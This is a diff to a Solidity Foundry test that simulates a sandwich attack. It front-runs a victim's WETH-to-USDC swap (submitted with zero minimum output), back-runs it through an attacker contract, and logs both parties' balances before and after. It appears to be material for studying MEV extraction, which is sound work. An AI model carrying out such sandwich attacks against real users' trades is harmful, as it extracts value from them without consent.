@@ -33,11 +33,56 @@ contract SandwichTest is Test {
     }
 
     function _frontrun() internal {
+        console2.log("11");
         attacker.firstSwap(WETH.balanceOf(address(attacker)));
+        console2.log("22");
     }
 
-    function _victim() internal{
-        address[] memory path = new address[]();
+    function _victim() internal {
+        address[] memory path = new address[](2);
         path[0] = address(WETH);
+        path[1] = address(USDC);
+        console2.log("111");
+        Router.swapExactTokensForTokens(
+            WETH.balanceOf(victim),
+            0,
+            path,
+            victim,
+            block.timestamp
+        );
+        console2.log("222");
+    }
+
+    function _backrun() internal {
+        console2.log("secondSwap:", address(attacker));
+        attacker.secondSwap(USDC.balanceOf(address(attacker)));
+    }
+
+    function testSandwich() public {
+        console2.log(
+            "USDC before: (attacker) ",
+            attacker.getUSDCBalance(address(attacker))
+        );
+        console2.log(
+            "WETH before: (attacker) ",
+            attacker.getWETHBalance(address(attacker))
+        );
+        console2.log("USDC before: (victim) ", attacker.getUSDCBalance(victim));
+        console2.log("WETH before: (victim) ", attacker.getWETHBalance(victim));
+
+        _frontrun();
+        _victim();
+        _backrun();
+
+        console2.log(
+            "USDC after: (attacker) ",
+            attacker.getUSDCBalance(address(attacker))
+        );
+        console2.log(
+            "WETH after: (attacker) ",
+            attacker.getWETHBalance(address(attacker))
+        );
+        console2.log("USDC after: (victim) ", attacker.getUSDCBalance(victim));
+        console2.log("WETH after: (victim) ", attacker.getWETHBalance(victim));
     }
 }
